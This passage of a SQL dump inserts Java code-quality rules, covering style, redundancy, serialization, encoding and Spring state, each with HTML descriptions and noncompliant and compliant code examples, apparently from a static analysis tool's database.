</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1min', NULL, NULL, 'convention', false, 'HTML', 1510817812826, 1510817812827, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (810, '"ThreadLocal.withInitial" should be preferred', 'S4065', NULL, 'squid', '<p>Java 8 Introduced <code>ThreadLocal.withInitial</code> which is a simpler alternative to creating an anonymous inner class to initialise a
<code>ThreadLocal</code> instance.</p>
<p>This rule raises an issue when a <code>ThreadLocal</code> anonymous inner class can be replaced by a call to
<code>ThreadLocal.withInitial</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
ThreadLocal&lt;List&lt;String&gt;&gt; myThreadLocal =
    new ThreadLocal&lt;List&lt;String&gt;&gt;() { // Noncompliant
        @Override
        protected List&lt;String&gt; initialValue() {
            return new ArrayList&lt;String&gt;();
        }
    };
</pre>
<h2>Compliant Solution</h2>
<pre>
ThreadLocal&lt;List&lt;String&gt;&gt; myThreadLocal = ThreadLocal.withInitial(ArrayList::new);
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'java8', false, 'HTML', 1510817812827, 1510817812828, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (811, 'Redundant casts should not be used', 'S1905', NULL, 'squid', '<p>Unnecessary casting expressions make the code harder to read and understand.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void example() {
  for (Foo obj : (List&lt;Foo&gt;) getFoos()) {  // Noncompliant; cast unnecessary because List&lt;Foo&gt; is what''s returned
    //...
  }
}

public List&lt;Foo&gt; getFoos() {
  return this.foos;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void example() {
  for (Foo obj : getFoos()) {
    //...
  }
}

public List&lt;Foo&gt; getFoos() {
  return this.foos;
}
</pre>
<h2>Exceptions</h2>
<p>Casting may be required to distinguish the method to call in the case of overloading:</p>
<pre>
class A {}
class B extends A{}
class C {
  void fun(A a){}
  void fun(B b){}

  void foo() {
    B b = new B();
    fun(b);
    fun((A) b); //call the first method so cast is not redundant.
  }

}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'clumsy,redundant', false, 'HTML', 1510817812828, 1510817812829, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (813, 'Variables should not be declared before they are relevant', 'S1941', NULL, 'squid', '<p>For the sake of clarity, variables should be declared as close to where they''re used as possible. This is particularly true when considering
methods that contain early returns and the potential to throw exceptions. In these cases, it is not only pointless, but also confusing to declare a
variable that may never be used because conditions for an early return are met first.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public boolean isConditionMet(int a, int b) {
  int difference = a - b;
  MyClass foo = new MyClass(a);  // Noncompliant; not used before early return

  if (difference &lt; 0) {
    return false;
  }

  // ...

  if (foo.doTheThing()) {
    return true;
  }
  return false;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public boolean isConditionMet(int a, int b) {
  int difference = a - b;

  if (difference &lt; 0) {
    return false;
  }

  // ...

  MyClass foo = new MyClass(a);
  if (foo.doTheThing()) {
    return true;
  }
  return false;
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'brain-overload', false, 'HTML', 1510817812831, 1510817812831, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (814, 'Classes should not have too many fields', 'S1820', NULL, 'squid', '<p>A class that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to maintain, and
having a lot of fields is an indication that a class has grown too large.</p>
<p>Above a specific threshold, it is strongly advised to refactor the class into smaller ones which focus on well defined topics.</p>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1h', NULL, NULL, 'brain-overload', false, 'HTML', 1510817812832, 1510817812833, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (815, 'A field should not duplicate the name of its containing class', 'S1700', NULL, 'squid', '<p>It''s confusing to have a class member with the same name (case differences aside) as its enclosing class. This is particularly so when you consider
the common practice of naming a class instance for the class itself.</p>
<p>Best practice dictates that any field or member with the same name as the enclosing class be renamed to be more descriptive of the particular
aspect of the class it represents or holds.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo {
  private String foo;

  public String getFoo() { }
}

Foo foo = new Foo();
foo.getFoo() // what does this return?
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo {
  private String name;

  public String getName() { }
}

//...

Foo foo = new Foo();
foo.getName()

</pre>
<h2>Exceptions</h2>
<p>When the type of the field is the containing class and that field is static, no issue is raised to allow singletons named like the type. </p>
<pre>
public class Foo {
  ...
  private static Foo foo;
  public Foo getInstance() {
    if(foo==null) {
      foo = new Foo();
    }
    return foo;
  }
  ...
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'brain-overload', false, 'HTML', 1510817812834, 1510817812835, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (816, 'Simple class names should be used', 'S1942', NULL, 'squid', '<p>Java''s <code>import</code> mechanism allows the use of simple class names. Therefore, using a class'' fully qualified name in a file that
<code>import</code>s the class is redundant and confusing.</p>
<h2>Noncompliant Code Example</h2>
<pre>
import java.util.List;
import java.sql.Timestamp;

//...

java.util.List&lt;String&gt; myList;  // Noncompliant
java.sql.Timestamp tStamp; // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
import java.util.List;
import java.sql.Timestamp;

//...

List&lt;String&gt; myList;
Timestamp tStamp;
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'confusing,redundant', false, 'HTML', 1510817812836, 1510817812836, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (836, 'Unused "private" classes should be removed', 'S3985', NULL, 'squid', '<p><code>private</code> classes that are never used are dead code: unnecessary, inoperative code that should be removed. Cleaning out dead code
decreases the size of the maintained codebase, making it easier to understand the program and preventing bugs from being introduced.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo
{
  ...
  private class MyUnusedPrivateClass {...} // Noncompliant
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'unused', false, 'HTML', 1510817812859, 1510817812860, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (817, 'Classes and methods that rely on the default system encoding should not be used', 'S1943', NULL, 'squid', '<p>Using classes and methods that rely on the default system encoding can result in code that works fine in its "home" environment. But that code may
break for customers who use different encodings in ways that are extremely difficult to diagnose and nearly, if not completely, impossible to
reproduce when it''s time to fix them.</p>
<p>This rule detects uses of the following classes and methods:</p>
<ul>
  <li> <code>FileReader</code> </li>
  <li> <code>FileWriter</code> </li>
  <li> String constructors with a <code>byte[]</code> argument but no <code>Charset</code> argument
    <ul>
      <li> <code>String(byte[] bytes)</code> </li>
      <li> <code>String(byte[] bytes, int offset, int length)</code> </li>
    </ul> </li>
  <li> <code>String.getBytes()</code> </li>
  <li> <code>String.getBytes(int srcBegin, int srcEnd, byte[] dst, int dstBegin)</code> </li>
  <li> <code>InputStreamReader(InputStream in)</code> </li>
  <li> <code>OutputStreamWriter(OutputStream out)</code> </li>
  <li> <code>ByteArrayOutputStream.toString()</code> </li>
  <li> Some <code>Formatter</code> constructors
    <ul>
      <li> <code>Formatter(String fileName)</code> </li>
      <li> <code>Formatter(File file)</code> </li>
      <li> <code>Formatter(OutputStream os)</code> </li>
    </ul> </li>
  <li> Some <code>Scanner</code> constructors
    <ul>
      <li> <code>Scanner(File source)</code> </li>
      <li> <code>Scanner(Path source)</code> </li>
      <li> <code>Scanner(InputStream source)</code> </li>
    </ul> </li>
  <li> Some <code>PrintStream</code> constructors
    <ul>
      <li> <code>PrintStream(File file)</code> </li>
      <li> <code>PrintStream(OutputStream out)</code> </li>
      <li> <code>PrintStream(OutputStream out, boolean autoFlush)</code> </li>
      <li> <code>PrintStream(String fileName)</code> </li>
    </ul> </li>
  <li> Some <code>PrintWriter</code> constructors
    <ul>
      <li> <code>PrintWriter(File file)</code> </li>
      <li> <code>PrintWriter(OutputStream out)</code> </li>
      <li> <code>PrintWriter(OutputStream out, boolean autoFlush)</code> </li>
      <li> <code>PrintWriter(String fileName)</code> </li>
    </ul> </li>
  <li> methods from Apache commons-io library which accept an encoding argument when that argument is null, and overloads of those methods that omit
  the encoding argument
    <ul>
      <li> <code>IOUtils.copy(InputStream, Writer)</code> </li>
      <li> <code>IOUtils.copy(Reader, OutputStream)</code> </li>
      <li> <code>IOUtils.readLines(InputStream)</code> </li>
      <li> <code>IOUtils.toByteArray(Reader)</code> </li>
      <li> <code>IOUtils.toByteArray(String)</code> </li>
      <li> <code>IOUtils.toCharArray(InputStream)</code> </li>
      <li> <code>IOUtils.toInputStream(TypeCriteria.subtypeOf(CharSequence))</code> </li>
      <li> <code>IOUtils.toString(byte[])</code> </li>
      <li> <code>IOUtils.toString(URI)</code> </li>
      <li> <code>IOUtils.toString(URL)</code> </li>
      <li> <code>IOUtils.write(char[], OutputStream)</code> </li>
      <li> <code>IOUtils.write(CharSequence, OutputStream)</code> </li>
      <li> <code>IOUtils.writeLines(Collection, String, OutputStream)</code> </li>
      <li> <code>FileUtils.readFileToString(File)</code> </li>
      <li> <code>FileUtils.readLines(File)</code> </li>
      <li> <code>FileUtils.write(File, CharSequence)</code> </li>
      <li> <code>FileUtils.write(File, CharSequence, boolean)</code> </li>
      <li> <code>FileUtils.writeStringToFile(File, String)</code> </li>
    </ul> </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/FoL5AQ">CERT, STR04-J.</a> - Use compatible character encodings when communicating
  string data between JVMs </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/JgAWCQ">CERT, STR50-J.</a> - Use the appropriate method for counting characters in a
  string </li>
</ul>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'cert,i18n,unpredictable', false, 'HTML', 1510817812837, 1510817812837, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (818, '"indexOf" checks should use a start position', 'S2912', NULL, 'squid', '<p>One thing that makes good code good is the clarity with which it conveys the intent of the original programmer to maintainers, and the proper
choice of <code>indexOf</code> methods can help move code from confusing to clear.</p>
<p>If you need to see whether a substring is located beyond a certain point in a string, you can test the <code>indexOf</code> the substring versus
the target point, or you can use the version of <code>indexOf</code> which takes a starting point argument. The latter is arguably clearer because the
result is tested against -1, which is an easily recognizable "not found" indicator.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String name = "ismael";

if (name.indexOf("ae") &gt; 2) { // Noncompliant
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
String name = "ismael";

if (name.indexOf("ae", 2) &gt; -1) {
  // ...
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'confusing', false, 'HTML', 1510817812838, 1510817812839, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (819, 'Fields in a "Serializable" class should either be transient or serializable', 'S1948', NULL, 'squid', '<p>Fields in a <code>Serializable</code> class must themselves be either <code>Serializable</code> or <code>transient</code> even if the class is
never explicitly serialized or deserialized. For instance, under load, most J2EE application frameworks flush objects to disk, and an allegedly
<code>Serializable</code> object with non-transient, non-serializable data members could cause program crashes, and open the door to attackers. In
general a <code>Serializable</code> class is expected to fulfil its contract and not have an unexpected behaviour when an instance is serialized. </p>
<p>This rule raises an issue on non-<code>Serializable</code> fields, and on collection fields when they are not <code>private</code> (because they
could be assigned non-<code>Serializable</code> values externally), and when they are assigned non-<code>Serializable</code> types within the
class.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Address {
  //...
}

public class Person implements Serializable {
  private static final long serialVersionUID = 1905122041950251207L;

  private String name;
  private Address address;  // Noncompliant; Address isn''t serializable
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Address implements Serializable {
  private static final long serialVersionUID = 2405172041950251807L;
}

public class Person implements Serializable {
  private static final long serialVersionUID = 1905122041950251207L;

  private String name;
  private Address address;
}
</pre>
<h2>Exceptions</h2>
<p>The alternative to making all members <code>serializable</code> or <code>transient</code> is to implement special methods which take on the
responsibility of properly serializing and de-serializing the object. This rule ignores classes which implement the following methods:</p>
<pre>
 private void writeObject(java.io.ObjectOutputStream out)
     throws IOException
 private void readObject(java.io.ObjectInputStream in)
     throws IOException, ClassNotFoundException;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/594.html">MITRE, CWE-594</a> - Saving Unserializable Objects to Disk </li>
  <li> <a href="http://docs.oracle.com/javase/6/docs/api/java/io/Serializable.html">Oracle Java 6, Serializable</a> </li>
  <li> <a href="http://docs.oracle.com/javase/7/docs/api/java/io/Serializable.html">Oracle Java 7, Serializable</a> </li>
</ul>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'cwe,serialization', false, 'HTML', 1510817812839, 1510817812840, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (820, 'A close curly brace should be located at the beginning of a line', 'RightCurlyBraceStartLineCheck', 'S1109', 'squid', '<p>Shared coding conventions make it possible for a team to efficiently collaborate. This rule makes it mandatory to place a close curly brace at the
beginning of a line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if(condition) {
  doSomething();}
</pre>
<h2>Compliant Solution</h2>
<pre>
if(condition) {
  doSomething();
}
</pre>
<h2>Exceptions</h2>
<p>When blocks are inlined (open and close curly braces on the same line), no issue is triggered. </p>
<pre>
if(condition) {doSomething();}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1min', NULL, NULL, 'convention', false, 'HTML', 1510817812840, 1510817812841, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (821, 'Boolean checks should not be inverted', 'S1940', NULL, 'squid', '<p>It is needlessly complex to invert the result of a boolean comparison. The opposite comparison should be made instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if ( !(a == 2)) { ...}  // Noncompliant
boolean b = !(i &lt; 10);  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
if (a != 2) { ...}
boolean b = (i &gt;= 10);
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'pitfall', false, 'HTML', 1510817812841, 1510817812842, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (822, '"close()" calls should not be redundant', 'S4087', NULL, 'squid', '<p>Java 7''s try-with-resources structure automatically handles closing the resources that the <code>try</code> itself opens. Thus, adding an explicit
<code>close()</code> call is redundant and potentially confusing.</p>
<h2>Noncompliant Code Example</h2>
<pre>
try (PrintWriter writer = new PrintWriter(process.getOutputStream())) {
  String contents = file.contents();
  writer.write(new Gson().toJson(new MyObject(contents)));
  writer.flush();
  writer.close();  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
try (PrintWriter writer = new PrintWriter(process.getOutputStream())) {
  String contents = file.contents();
  writer.write(new Gson().toJson(new MyObject(contents)));
  writer.flush();
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'redundant', false, 'HTML', 1510817812842, 1510817812842, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (823, '"equals(Object obj)" and "hashCode()" should be overridden in pairs', 'S1206', NULL, 'squid', '<p>According to the Java Language Specification, there is a contract between <code>equals(Object)</code> and <code>hashCode()</code>:</p>
<blockquote>
  <p>If two objects are equal according to the <code>equals(Object)</code> method, then calling the <code>hashCode</code> method on each of the two
  objects must produce the same integer result. </p>
  <p>It is not required that if two objects are unequal according to the <code>equals(java.lang.Object)</code> method, then calling the
  <code>hashCode</code> method on each of the two objects must produce distinct integer results.</p>
  <p>However, the programmer should be aware that producing distinct integer results for unequal objects may improve the performance of
  hashtables.</p>
</blockquote>
<p>In order to comply with this contract, those methods should be either both inherited, or both overridden.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyClass {    // Noncompliant - should also override "hashCode()"

  @Override
  public boolean equals(Object obj) {
    /* ... */
  }

}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {    // Compliant

  @Override
  public boolean equals(Object obj) {
    /* ... */
  }

  @Override
  public int hashCode() {
    /* ... */
  }

}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/581.html">MITRE, CWE-581</a> - Object Model Violation: Just One of Equals and Hashcode Defined
  </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/EYYbAQ">CERT, MET09-J.</a> - Classes that define an equals() method must also define a
  hashCode() method </li>
</ul>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'cert,cwe', false, 'HTML', 1510817812843, 1510817812843, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (824, 'Classes should not have too many methods', 'S1448', NULL, 'squid', '<p>A class that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to maintain.
Above a specific threshold, it is strongly advised to refactor the class into smaller ones which focus on well defined topics.</p>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1h', NULL, NULL, 'brain-overload', false, 'HTML', 1510817812844, 1510817812844, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (825, 'Classes should not be loaded dynamically', 'S2658', NULL, 'squid', '<p>Dynamically loaded classes could contain malicious code executed by a static class initializer. I.E. you wouldn''t even have to instantiate or
explicitly invoke methods on such classes to be vulnerable to an attack.</p>
<p>This rule raises an issue for each use of dynamic class loading.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String className = System.getProperty("messageClassName");
Class clazz = Class.forName(className);  // Noncompliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10_2013-A1-Injection">OWASP Top 10 2013 Category A1</a> - Injection </li>
</ul>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '45min', NULL, NULL, 'cwe,owasp-a1', false, 'HTML', 1510817812846, 1510817812847, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (826, 'Locale should be used in String operations', 'S1449', NULL, 'squid', '<p>Failure to specify a locale when calling the methods <code>toLowerCase()</code>, <code>toUpperCase()</code> or <code>format()</code> on
<code>String</code> objects means the system default encoding will be used, possibly creating problems with international characters or number
representations. For instance with the Turkish language, when converting the small letter ''i'' to upper case, the result is capital letter ''I'' with a
dot over it.</p>
<p>Case conversion without a locale may work fine in its "home" environment, but break in ways that are extremely difficult to diagnose for customers
who use different encodings. Such bugs can be nearly, if not completely, impossible to reproduce when it''s time to fix them. For locale-sensitive
strings, the correct locale should always be used, but <code>Locale.ENGLISH</code> can be used for case-insensitive ones.</p>
<h2>Noncompliant Code Example</h2>
<pre>
myString.toLowerCase()
</pre>
<h2>Compliant Solution</h2>
<pre>
myString.toLowerCase(Locale.TR)
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/EwAiAg">CERT, STR02-J.</a> - Specify an appropriate locale when comparing
  locale-dependent data </li>
</ul>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cert,unpredictable', false, 'HTML', 1510817812847, 1510817812847, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (837, 'Inheritance tree of classes should not be too deep', 'MaximumInheritanceDepth', 'S110', 'squid', '<p>Inheritance is certainly one of the most valuable concepts in object-oriented programming. It''s a way to compartmentalize and reuse code by
creating collections of attributes and behaviors called classes which can be based on previously created classes. But abusing this concept by creating
a deep inheritance tree can lead to very complex and unmaintainable source code. Most of the time a too deep inheritance tree is due to bad object
oriented design which has led to systematically use ''inheritance'' when for instance ''composition'' would suit better.</p>
<p>This rule raises an issue when the inheritance tree, starting from <code>Object</code> has a greater depth than is allowed. </p>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'LINEAR_OFFSET', NULL, '30min', NULL, '4h', 'Number of parents above the defined threshold', NULL, 'design', false, 'HTML', 1510817812860, 1510817812861, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (827, 'Members of Spring components should be injected', 'S3749', NULL, 'squid', '<p>Spring <code>@Controller</code>s, <code>@Service</code>s, and <code>@Repository</code>s are singletons by default, meaning only one instance of the
class is ever instantiated in the application. Typically such a class might have a few <code>static</code> members, such as a logger, but all
non-<code>static</code> members should be managed by Spring. That is, they should have one of these annotations: <code>@Resource</code>,
<code>@Inject</code>, <code>@Autowired</code> or <code>@Value</code>.</p>
<p>Having non-injected members in one of these classes could indicate an attempt to manage state. Because they are singletons, such an attempt is
almost guaranteed to eventually expose data from User1''s session to User2. </p>
<p>This rule raises an issue when a singleton <code>@Controller</code>, <code>@Service</code>, or <code>@Repository</code> has non-<code>static</code>
members that are not annotated with one of:</p>
<ul>
  <li> <code>org.springframework.beans.factory.annotation.Autowired</code> </li>
  <li> <code>org.springframework.beans.factory.annotation.Value</code> </li>
  <li> <code>javax.annotation.Inject</code> </li>
  <li> <code>javax.annotation.Resource</code> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
@Controller
public class HelloWorld {

  private String name = null;

  @RequestMapping("/greet", method = GET)
  public String greet(String greetee) {

    if (greetee != null) {
      this.name = greetee;
    }

    return "Hello " + this.name;  // if greetee is null, you see the previous user''s data
  }
}
</pre>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'spring', false, 'HTML', 1510817812848, 1510817812848, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (828, 'Source code should be indented consistently', 'IndentationCheck', 'S1120', 'squid', '<p>Proper indentation is a simple and effective way to improve the code''s readability. Consistent indentation among the developers within a team also
reduces the differences that are committed to source control systems, making code reviews easier. </p>
<p>This rule raises an issue when indentation does not match the configured value. Only the first line of a badly indented section is reported.</p>
<h2>Noncompliant Code Example</h2>
<p>With an indent size of 2:</p>
<pre>
class Foo {
  public int a;
   public int b;   // Noncompliant, expected to start at column 4

...

  public void doSomething() {
    if(something) {
          doSomethingElse();  // Noncompliant, expected to start at column 6
  }   // Noncompliant, expected to start at column 4
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Foo {
  public int a;
  public int b;

...

  public void doSomething() {
    if(something) {
        doSomethingElse();
    }
  }
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1min', NULL, NULL, 'style', false, 'HTML', 1510817812849, 1510817812850, 1);
